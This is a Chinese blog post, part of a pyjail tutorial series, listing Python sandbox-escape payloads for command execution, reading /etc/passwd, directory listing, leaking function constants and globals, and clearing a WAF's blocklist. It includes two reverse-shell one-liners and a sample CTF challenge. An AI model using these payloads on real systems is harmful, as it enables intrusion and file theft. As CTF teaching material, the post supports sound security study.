---
title: pyjail theory-03 逃逸目标
date: 2023-05-29 05:04:02
categories:
- Python
tags:
- pyjail
mermaid: true
image:
  path: /assets/images/pyjail.jpg
toc: true
---

> - [内省机制](/posts/pyjail-theory-01-内省机制/)
> - [认识 sandbox](/posts/pyjail-theory-02-认识-sandbox/)
> - [逃逸目标](/posts/pyjail-theory-03-逃逸目标/)

## 逃逸目标
了解沙箱逃逸的目标才能有的放矢，沙箱逃逸的目标是执行 shell 、读写文件或者获取环境信息如环境变量等.

### 命令执行

#### timeit 模块
```py
import timeit
timeit.timeit("__import__('os').system('ls')",number=1)
```

#### exec 函数
```py
exec('__import__("os").system("ls")')
```

#### eval 函数
```py
eval('__import__("os").system("ls")')
```
eval 无法直接达到执行多行代码的效果，使用 compile 函数并传入 exec 模式就能够实现。
```py
eval(compile('__import__("os").system("ls")', '<string>', 'exec'))
```

#### platform 模块
```py
import platform
platform.sys.modules['os'].system('ls')
platform.os.system('ls')
```
#### os模块
- os.system
- os.popen
- os.posix_spawn
- os.exec*
- os.spawnv

```py
import os
os.system('ls')
__import__('os').system('ls')

os.popen("ls").read()

os.posix_spawn("/bin/ls", ["/bin/ls", "-l"], os.environ)

os.posix_spawn("/bin/bash", ["/bin/bash"], os.environ)

os.spawnv(0,"/bin/ls", ["/bin/ls", "-l"])
```

os.exec*()
```py
import os

# os.execl
os.execl('/bin/sh', 'xx')
__import__('os').execl('/bin/sh', 'xx')

# os.execle
os.execle('/bin/sh', 'xx', os.environ)
__import__('os').execle('/bin/sh', 'xx', __import__('os').environ)

# os.execlp
os.execlp('sh', 'xx')
__import__('os').execle('/bin/sh', 'xx', __import__('os').environ)

# os.execlpe
os.execlpe('sh', 'xx', os.environ)
__import__('os').execlpe('sh', 'xx', __import__('os').environ)

# os.execv
os.execv('/bin/sh', ['xx'])
__import__('os').execv('/bin/sh', ['xx'])

# os.execve
os.execve('/bin/sh', ['xx'], os.environ)
__import__('os').execve('/bin/sh', ['xx'], __import__('os').environ)

# os.execvp
os.execvp('sh', ['xx'])
__import__('os').execvp('sh', ['xx'])

# os.execvpe
os.execvpe('sh', ['xx'], os.environ)
__import__('os').execvpe('sh', ['xx'], __import__('os').environ)
```

os.fork() with os.exec*()
```py
(__import__('os').fork() == 0) and __import__('os').system('ls')
```

#### subprocess 模块
```py
import subprocess
subprocess.Popen('ls', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()

# python2
subprocess.call('whoami', shell=True)
subprocess.check_call('whoami', shell=True)
subprocess.check_output('whoami', shell=True)
subprocess.Popen('whoami', shell=True)

# python3
subprocess.run('whoami', shell=True)
subprocess.getoutput('whoami')
subprocess.getstatusoutput('whoami')
subprocess.call('whoami', shell=True)
subprocess.check_call('whoami', shell=True)
subprocess.check_output('whoami', shell=True)
subprocess.Popen('whoami', shell=True)
__import__('subprocess').Popen('whoami', shell=True)
```


#### pty模块
- pty.spawn

仅限Linux环境

```py
import pty
pty.spawn("ls")
__import__('pty').spawn("ls")
```

#### importlib 模块
```py
import importlib
__import__('importlib').import_module('os').system('ls')
# Python3可以，Python2没有该函数
importlib.__import__('os').system('ls')
```

#### sys

该模块通过 modules() 函数获取 os 模块并执行命令。

```py
import sys
sys.modules['os'].system('calc')
```

#### `__builtins__` 利用
`__builtins__`： 是一个 builtins 模块的一个引用，其中包含 Python 的内置名称。这个模块自动在所有模块的全局命名空间中导入。当然我们也可以使用 `import builtins` 来导入

它包含许多基本函数（如 print、len 等）和基本类（如 object、int、list 等）。这就是可以在 Python 脚本中直接使用 print、len 等函数，而无需导入任何模块的原因。

我们可以使用 dir() 查看当前模块的属性列表. 其中就可以看到 `__builtins__`

内置的函数中 open 与文件操作相关，（python2 中为 file 函数）
```py
__builtins__.open('/etc/passwd').read()
__import__("builtins").open('/etc/passwd').read()
```

`__builtins__`除了读取文件之外还可以通过调用其 `__import__` 属性来引入别的模块执行命令。
```py
>>> __builtins__.__import__
<built-in function __import__>
>>> __builtins__.__import__('os').system('ls')
```
由于每个导入的模块都会留存一个 `__builtins__` 属性，因此我们可以在任意的模块中通过`__builtins__`来引入模块或者执行文件操作。需要注意的是，`__builtins__`在模块级别和全局级别的表现有所不同。

在全局级别（也就是你在Python交互式解释器中直接查看`__builtins__`时），`__builtins__`实际上是一个模块`<module '__builtin__' (built-in)>`。

在模块级别（也就是你在一个Python脚本中查看__builtins__），`__builtins__`是一个字典，这个字典包含了`__builtin__`模块中所有的函数和类。


因此，当通过其他模块的 `__builtins__`时，如`__import__('types').__builtins__`时，实际上看到的是一个字典，包含了所有的内建函数和类。此时调用的方式有所变化。
```py
>>> __import__('types').__builtins__['__import__']
<built-in function __import__>
```

很多时候我们要获取 builtins，获取 builtins 方法多样，需要结合已有的条件加以分析，如果存在内置函数，则可以通过 `__self__` 快速获取 `builtins` 模块。
```py
print.__self__
print.__self__.exec
```

#### help 函数
help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh

以下面的环境为例

```py
eval((__import__("re").sub(r'[a-z0-9]','',input("code > ").lower()))[:130])
```
当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助
```py
𝘩𝘦𝘭𝘱()
```
然后输入 os,此时会进入 os 的帮助文档。
```py
help> os
```
然后在输入 `!sh` 就可以拿到 /bin/sh, 输入 `!bash` 则可以拿到 /bin/bash
```py
help> os
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
$ 
```

#### breakpoint 函数
pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。

在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码
```py
>>> 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
--Return--
> <stdin>(1)<module>()->None
(Pdb) __import__('os').system('ls')
a-z0-9.py  exp2.py  exp.py  flag.txt
0
(Pdb) __import__('os').system('sh')
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
```
#### ctypes
```py
import ctypes

libc = ctypes.CDLL(None)
libc.system('ls ./'.encode())  # 使用 encode() 方法将字符串转换为字节字符串
```

沙箱中可以这么用：
```py
__import__('ctypes').CDLL(None).system('ls /'.encode())
```

#### threading
利用新的线程来执行函数
```py
import threading
import os

def func():
    os.system('ls')  # 在新的线程中执行命令

t = threading.Thread(target=func)  # 创建一个新的线程
t.start()  # 开始执行新的线程

```
写成一行:
```py
# eval, exec 都可以执行的版本
__import__('threading').Thread(target=lambda: __import__('os').system('ls')).start() 

# exec 可执行
import threading, os; threading.Thread(target=lambda: os.system('ls')).start()
```

#### multiprocessing
```py
import multiprocessing
import os

def func():
    os.system('ls') 

p = multiprocessing.Process(target=func) 
p.start()
```

```py
__import__('multiprocessing').Process(target=lambda: __import__('os').system('ls')).start()
```

#### _posixsubprocess 
```py
import os
import _posixsubprocess

_posixsubprocess.fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

结合 `__loader__.load_module(fullname)` 导入模块
```py
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module('os').pipe()), False, False,False, None, None, None, -1, None, False)
```

#### 反弹 shell
```py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
```

```py
s=__import__('socket').socket(__import__('socket').AF_INET,__import__('socket').SOCK_STREAM);s.connect(("127.0.0.1",12345));[__import__('os').dup2(s.fileno(),i) for i in range(3)];__import__('pty').spawn("/bin/sh")
```

#### 构造代码对象进行 RCE
`CodeType` 是 python 的内置类型之一，用于表示编译后的字节码对象。`CodeType` 对象包含了函数、方法或模块的字节码指令序列以及与之相关的属性。

python 中关于 code class 的文档链接:
- [types — Dynamic type creation and names for built-in types — Python 3.11.3 documentation](https://docs.python.org/3/library/types.html#types.CodeType)


`CodeType` 对象具有以下属性：
- `co_argcount`: 函数的参数数量，不包括可变参数和关键字参数。
- `co_cellvars`: 函数内部使用的闭包变量的名称列表。
- `co_code`: 函数的字节码指令序列，以二进制形式表示。
- `co_consts`: 函数中使用的常量的元组，包括整数、浮点数、字符串等。
- `co_exceptiontable`: 异常处理表，用于描述函数中的异常处理。
- `co_filename`: 函数所在的文件名。
- `co_firstlineno`: 函数定义的第一行所在的行号。
- `co_flags`: 函数的标志位，表示函数的属性和特征，如是否有默认参数、是否是生成器函数等。
- `co_freevars`: 函数中使用的自由变量的名称列表，自由变量是在函数外部定义但在函数内部被引用的变量。
- `co_kwonlyargcount`: 函数的关键字参数数量。
- `co_lines`: 函数的源代码行列表。
- `co_linetable`: 函数的行号和字节码指令索引之间的映射表。
- `co_lnotab`: 表示行号和字节码指令索引之间的映射关系的字符串。
- `co_name`: 函数的名称。
- `co_names`: 函数中使用的全局变量的名称列表。
- `co_nlocals`: 函数中局部变量的数量。
- `co_positions`: 函数中与位置相关的变量（比如闭包中的自由变量）的名称列表。
- `co_posonlyargcount`: 函数的仅位置参数数量。
- `co_qualname`: 函数的限定名称，包含了函数所在的模块和类名。
- `co_stacksize`: 函数的堆栈大小，表示函数执行时所需的堆栈空间。
- `co_varnames`: 函数中局部变量的名称列表。

假设存在如下的一个函数. 
```py
def get_flag(some_input):
    var1=1
    var2="secretcode"
    var3=["some","array"]
    def calc_flag(flag_rot2):
        return ''.join(chr(ord(c)-2) for c in flag_rot2)
    if some_input == var2:
        return calc_flag("VjkuKuVjgHnci")
    else:
        return "Nope"
```
我们可以通过 `get_flag.__code__` 获取其代码对象. 代码对象包含了关于代码的所有信息, 例如 co_code 属性存储了字节码信息, 因此修改这个字节码就可以达到修改函数执行的目的, 但需要注意的是，python 可以将某个函数的 `__code__` 对象整个进行修改。仅仅修改其中的子属性是不行的。如下所示, python 会抛出异常.
```py
>>> get_flag.__code__.co_code
b'\x97\x00d\x01}\x01d\x02}\x02d\x03d\x04g\x02}\x03d\x05\x84\x00}\x04|\x00|\x02k\x02\x00\x00\x00\x00r\x0b\x02\x00|\x04d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00d\x07S\x00'
>>> get_flag.__code__.co_code = 1
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: attribute 'co_code' of 'code' objects is not writable
```

这种情况下,我们需要构造一个新的代码对象并主动执行.具体步骤如下：

1. 第一步，本地构造 payload
    ```py
    def read():
        return print(open("/etc/passwd",'r').read())
    ```
2. 获取创建代码对象所需的参数, 通过 help 或者 `__doc__` 属性进行获取, 不同的版本有所差异， 我在本地测试时版本为 python 3.11.2，此时 code 需要传入 17 个参数，且不支持关键字传递。
   ```py
    >>>> import types
    >>> help(types.CodeType)
    code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars=(), cellvars=(), /)
   ```
   
3. 参数赋值。获取到所需的参数之后，我们可以将这些参数先保存在变量中。
   ```py
    code = read.__code__
   
    argcount = code.co_argcount
    posonlyargcount = code.co_posonlyargcount
    kwonlyargcount = code.co_kwonlyargcount
    nlocals = code.co_nlocals
    stacksize = code.co_stacksize
    flags = code.co_flags
    codestring = code.co_code
    constants = code.co_consts
    names = code.co_names
    varnames = code.co_varnames
    filename = code.co_filename
    name = code.co_name
    qualname = code.co_qualname
    firstlineno = code.co_firstlineno
    linetable = code.co_linetable
    exceptiontable = code.co_exceptiontable
    freevars = code.co_freevars
    cellvars = code.co_cellvars
   ```
4. 创建代码对象。创建代码对象需要调用 types.CodeType。
   ```py
   import types
   codeobj = types.CodeType(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars, cellvars)
   ```
   也可以使用 builtins 中的 type 函数获取到这个类
   ```py
   code_type = type((lambda: None).__code__)
   ```
5. 调用函数。从代码对象进行调用需要创建一个函数对象, 获取这个类可以使用 type 函数，或者直接 import
   ```py
   function_type = type(lambda: None)
   ```
   创建函数对象所需的参数如下，可以通过 help 函数查看
   ```py
   function(code, globals, name=None, argdefs=None, closure=None)
   ```
   一般情况下只需要前两个参数即可：
   ```py
   mydict = {}
   mydict['__builtins__'] = __builtins__
   function_type(codeobj, mydict, None, None, None)()
   ```

6. 调用函数也可以直接使用 eval 或者 exec
   ```py
   eval(codeobj)
   ```

完整代码如下：
```py
def read():
        return print(open("/etc/passwd",'r').read())

function_type = type(lambda: None)
code_type = type((lambda: None).__code__)

code = read.__code__

argcount = code.co_argcount
posonlyargcount = code.co_posonlyargcount
kwonlyargcount = code.co_kwonlyargcount
nlocals = code.co_nlocals
stacksize = code.co_stacksize
flags = code.co_flags
codestring = code.co_code
constants = code.co_consts
names = code.co_names
varnames = code.co_varnames
filename = code.co_filename
name = code.co_name
qualname = code.co_qualname
firstlineno = code.co_firstlineno
linetable = code.co_linetable
exceptiontable = code.co_exceptiontable
freevars = code.co_freevars
cellvars = code.co_cellvars


mydict = {}
mydict['__builtins__'] = __builtins__

codeobj = code_type(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars, cellvars)
# code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars=(), cellvars=(),/)

# function_type(codeobj, mydict, None, None, None)()
eval(codeobj)
```

最终可以成功读取 /etc/passwd

#### 迭代器

### 读写文件

#### file 类
```py
# Python2 
file('test.txt').read()
#注意：该函数只存在于Python2，Python3不存在
```
#### open 函数
```py
open('/etc/passwd').read()
__builtins__['open']('/etc/passwd').read()
__import__("builtins").open('/etc/passwd').read()
```
#### codecs 模块
```py
import codecs
codecs.open('test.txt').read()
```
#### get_data 函数
FileLoader 类 
```py
# _frozen_importlib_external.FileLoader.get_data(0,<filename>)
"".__class__.__bases__[0].__subclasses__()[91].get_data(0,"app.py")
```
相比于获取 `__builtins__` 再使用 open 去进行读取,使用 get_data 的 payload 更短.

#### linecache 模块
getlines 函数
```py
>>> import linecache
>>> linecache.getlines('/etc/passwd')
>>> __import__("linecache").getlines('/etc/passwd')
```

getline 函数需要第二个参数指定行号
```py
__import__("linecache").getline('/etc/passwd',1)
```

#### license 函数
```py
__builtins__.__dict__["license"]._Printer__filenames=["/etc/passwd"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
```
### 枚举目录
#### os 模块
```py
import os
os.listdir("/")

__import__('os').listdir('/')
```
#### glob 模块
```py
import glob
glob.glob("f*")

__import__('glob').glob("f*") 
```

### 获取函数信息

python 中的每一个函数对象都有一个 `__code__` 属性.这个`__code__` 属性就是上面的代码对象，存放了大量有关于该函数的信息.

假设上下文存在一个函数
```py
def get_flag(some_input):
    var1=1
    var2="secretcode"
    var3=["some","array"]
    if some_input == var2:
        return "THIS-IS-THE-FALG!"
    else:
        return "Nope"
```
`__code__` 属性包含了诸多子属性,这些子属性用于描述函数的字节码对象,下面是对这些属性的解释：
- `co_argcount`: 函数的参数数量，不包括可变参数和关键字参数。
- `co_cellvars`: 函数内部使用的闭包变量的名称列表。
- `co_code`: 函数的字节码指令序列，以二进制形式表示。
- `co_consts`: 函数中使用的常量的元组，包括整数、浮点数、字符串等。
- `co_exceptiontable`: 异常处理表，用于描述函数中的异常处理。
- `co_filename`: 函数所在的文件名。
- `co_firstlineno`: 函数定义的第一行所在的行号。
- `co_flags`: 函数的标志位，表示函数的属性和特征，如是否有默认参数、是否是生成器函数等。
- `co_freevars`: 函数中使用的自由变量的名称列表，自由变量是在函数外部定义但在函数内部被引用的变量。
- `co_kwonlyargcount`: 函数的关键字参数数量。
- `co_lines`: 函数的源代码行列表。
- `co_linetable`: 函数的行号和字节码指令索引之间的映射表。
- `co_lnotab`: 表示行号和字节码指令索引之间的映射关系的字符串。
- `co_name`: 函数的名称。
- `co_names`: 函数中使用的全局变量的名称列表。
- `co_nlocals`: 函数中局部变量的数量。
- `co_positions`: 函数中与位置相关的变量（比如闭包中的自由变量）的名称列表。
- `co_posonlyargcount`: 函数的仅位置参数数量。
- `co_qualname`: 函数的限定名称，包含了函数所在的模块和类名。
- `co_stacksize`: 函数的堆栈大小，表示函数执行时所需的堆栈空间。
- `co_varnames`: 函数中局部变量的名称列表。


下面是一些使用示例:

#### 获取源代码中的常量

可以使用 `__code__.co_consts` 这种方法进行获取, co_consts 可以获取常量.
```py
>>> get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')
```

#### 获取变量

则可以使用如下的 payload 获取 get_flag 函数中的变量信息
```py
__globals__

get_flag.__globals__

>>> get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')
```

#### 获取函数字节码序列
get_flag 函数的 `.__code__.co_code`, 可以获取到函数的字节码序列:
```py
>>> get_flag.__code__.co_code
b'\x97\x00d\x01}\x01d\x02}\x02d\x03d\x04g\x02}\x03|\x00|\x02k\x02\x00\x00\x00\x00r\x02d\x05S\x00d\x06S\x00'
```

字节码并不包含源代码的完整信息，如变量名、注释等。但可以使用 dis 模块来反汇编字节码并获取大致的源代码.
```py
>>> bytecode = get_flag.__code__.co_code
>>> dis.dis(bytecode)
          0 RESUME                   0
          2 LOAD_CONST               1
          4 STORE_FAST               1
          6 LOAD_CONST               2
          8 STORE_FAST               2
         10 LOAD_CONST               3
         12 LOAD_CONST               4
         14 BUILD_LIST               2
         16 STORE_FAST               3
         18 LOAD_FAST                0
         20 LOAD_FAST                2
         22 COMPARE_OP               2 (==)
         28 POP_JUMP_FORWARD_IF_FALSE     2 (to 34)
         30 LOAD_CONST               5
         32 RETURN_VALUE
    >>   34 LOAD_CONST               6
         36 RETURN_VALUE
```
虽然能获取但不太方便看,如果能够获取 `__code__` 对象,也可以通过 dis.disassemble 获取更清晰的表示.
```py
>>> bytecode = get_flag.__code__
>>> dis.disassemble(bytecode)
  1           0 RESUME                   0

  2           2 LOAD_CONST               1 (1)
              4 STORE_FAST               1 (var1)

  3           6 LOAD_CONST               2 ('secretcode')
              8 STORE_FAST               2 (var2)

  4          10 LOAD_CONST               3 ('some')
             12 LOAD_CONST               4 ('array')
             14 BUILD_LIST               2
             16 STORE_FAST               3 (var3)

  5          18 LOAD_FAST                0 (some_input)
             20 LOAD_FAST                2 (var2)
             22 COMPARE_OP               2 (==)
             28 POP_JUMP_FORWARD_IF_FALSE     2 (to 34)

  6          30 LOAD_CONST               5 ('THIS-IS-THE-FALG!')
             32 RETURN_VALUE

  8     >>   34 LOAD_CONST               6 ('Nope')
             36 RETURN_VALUE
```


### 获取环境信息


#### 获取 python 版本
sys 模块
```py
import sys
sys.version
```

platform 模块
```py
import platform
platform.python_version()
```
#### 获取 linux 版本
platform 模块
```py
import platform
platform.uname()
```
#### 获取路径
```py
sys.path
sys.modules
```


### 获取全局变量
#### globals 函数
globals 函数可以获取所有的全局变量。下面是一个例题，题目的目标就是获取 fake_key_var_in_the_local_but_real_in_the_remote 的值进入 backdoor 函数。这里使用 globals 就可以获取 fake_key_var_in_the_local_but_real_in_the_remote 的值。
```py
#it seems have a backdoor
#can u find the key of it and use the backdoor

fake_key_var_in_the_local_but_real_in_the_remote = "[DELETED]"

def func():
    code = input(">")
    if(len(code)>9):
        return print("you're hacker!")
    try:
        print(eval(code))
    except:
        pass

def backdoor():
    print("Please enter the admin key")
    key = input(">")
    if(key == fake_key_var_in_the_local_but_real_in_the_remote):
        code = input(">")
        try:
            print(eval(code))
        except:
            pass
    else:
        print("Nooo!!!!")

WELCOME = '''
  _       _          _       _          _       _        
 | |     | |        | |     | |        | |     | |       
 | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ 
 | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \
 | | (_| |   <  __/ | | (_| |   <  __/ | | (_| |   <  __/
 |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     
'''

print(WELCOME)

print("Now the program has two functions")
print("can you use dockerdoor")
print("1.func")
print("2.backdoor")
input_data = input("> ")
if(input_data == "1"):
    func()
    exit(0)
elif(input_data == "2"):
    backdoor()
    exit(0)
else:
    print("not found the choice")
    exit(0)
```

#### help 函数
help 函数也可以获取某个模块的帮助信息，包括全局变量, 输入 `__main__` 之后可以获取当前模块的信息。
```py
help> __main__
```
相比 globals() 而言 help() 更短，在一些限制长度的题目中有利用过这个点。

#### vars 函数
vars() 函数返回该对象的命名空间（namespace）中的所有属性以字典的形式表示。当前模块的所有变量也会包含在里面，一些过滤链 globals 和 help 函数的场景可以尝试使用 vars()

### 获取模块内部函数或变量
#### 获取指定模块内部变量
获取模块内部函数或变量的目的主要是为了信息泄露或篡改。比如 waf.py 中存在某个变量定义了危险字符列表，我们可以考虑先获取这个变量然后将其清空。

可以先获取 load_module，然后通过 load_module 导入特定的模块，进而篡改其中变量。
```py
list(().__class__.__bases__.__iter__().__next__().__subclasses__().__getitem__(84).load_module("waf").__dict__.values()).__getitem__(8).clear()
```

#### 获取 `__main__` 中变量
例如获取 `__main__` 
```py
sys.modules['__main__'].__dict__['app']
```
#### 获取命令空间中的变量/模块/函数等
`__globals__`是一个特殊属性，能够以 dict 的形式返回**函数**（注意是函数）所在模块命名空间的所有变量，其中包含了很多已经引入的 modules。
```py
url_for.__globals__['request']
url_for.__globals__['current_app']
```